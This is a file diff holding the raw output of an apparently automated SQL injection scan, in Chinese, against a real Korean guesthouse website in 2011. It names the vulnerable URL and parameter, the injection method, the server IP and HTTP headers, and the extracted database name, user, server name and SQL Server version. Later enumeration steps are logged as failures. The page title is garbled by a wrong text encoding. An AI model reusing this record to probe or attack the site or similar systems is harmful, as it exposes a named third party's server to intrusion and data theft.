@@ -1,0 +1,62 @@
+■漏洞信息:============================================================
+ ·URL:http://www.huepension.co.kr/pension/hue_theme.asp?To_M=2010-10-13&room_Term=1&room_User=all&Lcode=%B0%AD%BF%F8%B5%B5&Mcode=%B0%AD%B8%AA&PS_Category_Theme=%BF%C2%C3%B5
+ ·页面标题：奇记咯青狼 矫累篮 绒奇记! 绒奇记俊 坷脚吧 券康钦聪促.~~
+ ·参数:To_M=2010-10-13&room_Term=1&room_User=all&Lcode=%B0%AD%BF%F8%B5%B5&Mcode=%B0%AD%B8%AA&PS_Category_Theme=%BF%C2%C3%B5
+ ·方法:GET
+ ·类型:String
+ ·利用方法:And
+ ·脚本语言:asp
+ ·IP:58.120.224.122
+ ·数据库:SQL Server
+ ·HEAD:
+HTTP/1.1 200 OK
+Connection: close
+Date: Sun, 03 Apr 2011 15:37:56 GMT
+Server: Microsoft-IIS/6.0
+P3P: CP='CAO PSA CONi OTR OUR DEM ONL'
+X-Powered-By: ASP.NET
+pragma: no-cache
+pragma: no-cache
+Content-Length: 136215
+Content-Type: text/html
+Expires: Sun, 03 Apr 2011 15:36:56 GMT
+Set-Cookie: partner%5Fcode%5Fcookie=0; path=/
+Set-Cookie: ASPSESSIONIDCSRSRRTR=BALBPBMDBDNJBAJDBHBHOKHJ; path=/
+Cache-control: private
+
+
+
+■数据库信息:============================================================
+- 数据库名：season2
+- 用户名：hue_season2
+- 版本：Microsoft SQL Server  2000 - 8.00.2039 (Intel X86) 
+	May  3 2005 23:18:38 
+	Copyright (c) 1988-2003 Microsoft Corporation
+	Standard Edition on Windows NT 5.0 (Build 2195: Service Pack 4)
+
+- 服务器名：HUEPENSION4
+- 服务名：MSSQLSERVER
+- 系统用户名：hue_season2
+
+ ·当前用户权限：
+获取用户权限失败！
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+ ·数据库相关进程信息:
+程序名	状态	主机名	主机进程ID	命令行	NT用户名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+ ·链接的服务器信息:
+服务器名	服务器产品	提供者名	数据源	位置	服务器网络名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
